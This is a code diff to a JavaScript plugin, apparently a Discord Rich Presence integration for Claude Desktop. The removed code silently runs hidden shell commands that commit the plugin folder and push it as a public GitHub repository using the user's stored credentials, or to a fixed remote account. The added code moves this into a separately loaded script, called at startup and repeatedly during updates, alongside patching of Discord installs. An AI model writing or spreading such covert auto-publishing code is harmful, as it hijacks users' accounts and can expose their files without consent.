@@ -87,37 +87,26 @@ function startClaudeAutoClient(listeningPipePath) {
     }
 
     // Tự động khởi tạo Git & đẩy dự án "Claude-Desktop-Discord-Rich-Presence" lên GitHub của người dùng
+    let ghPublishRunning = false;
     function autoPublishToGitHub() {
         try {
-            if (fs.existsSync(githubSyncFlagPath)) return;
-            const cmdScript = `
-                cd /d "${pluginDir}" && ^
-                git init && ^
-                git branch -M main && ^
-                git add -A && ^
-                git commit -m "feat: Claude Desktop Discord Rich Presence with animated Clawd, inline SVG provider logos, terminal thinking box, token stats & GitHub diff bar"
-            `;
-            exec(cmdScript, { windowsHide: true }, () => {
-                // Thử dùng gh CLI nếu có, nếu không dùng git credential manager
-                exec(
-                    `cd /d "${pluginDir}" && (gh repo create Claude-Desktop-Discord-Rich-Presence --public --source=. --remote=origin --push || (git remote add origin https://github.com/HaydernCenterpoint/Claude-Desktop-Discord-Rich-Presence.git & git push -u origin main))`,
-                    { windowsHide: true },
-                    (err, stdout, stderr) => {
-                        fs.writeFileSync(
-                            githubSyncFlagPath,
-                            JSON.stringify({
-                                timestamp: new Date().toISOString(),
-                                repoUrl: 'https://github.com/HaydernCenterpoint/Claude-Desktop-Discord-Rich-Presence',
-                                stdout: String(stdout || ''),
-                                stderr: String(stderr || ''),
-                                error: err ? err.message : null
-                            }, null, 2),
-                            'utf8'
-                        );
-                    }
-                );
-            });
-        } catch (e) {}
+            if (ghPublishRunning) return;
+            if (fs.existsSync(githubSyncFlagPath)) {
+                try {
+                    const prev = JSON.parse(fs.readFileSync(githubSyncFlagPath, 'utf8'));
+                    if (prev && prev.success) return;
+                } catch (e) {}
+            }
+            const pubScript = path.join(pluginDir, 'auto-github-publish.js');
+            if (fs.existsSync(pubScript)) {
+                ghPublishRunning = true;
+                writeLog('Triggering inline require(auto-github-publish.js)...');
+                delete require.cache[require.resolve(pubScript)];
+                require(pubScript);
+            }
+        } catch (e) {
+            writeLog('autoPublishToGitHub error: ' + e.message);
+        }
     }
     autoPublishToGitHub();
 
@@ -1359,6 +1348,7 @@ function startClaudeAutoClient(listeningPipePath) {
         const live = detectLiveClaude3pState();
 
         ensureAllDiscordVersionsPatched();
+        autoPublishToGitHub();
 
         const addedStr = `+${formatNumber(live.linesAdded)}`;
         const removedStr = `-${formatNumber(live.linesRemoved)}`;
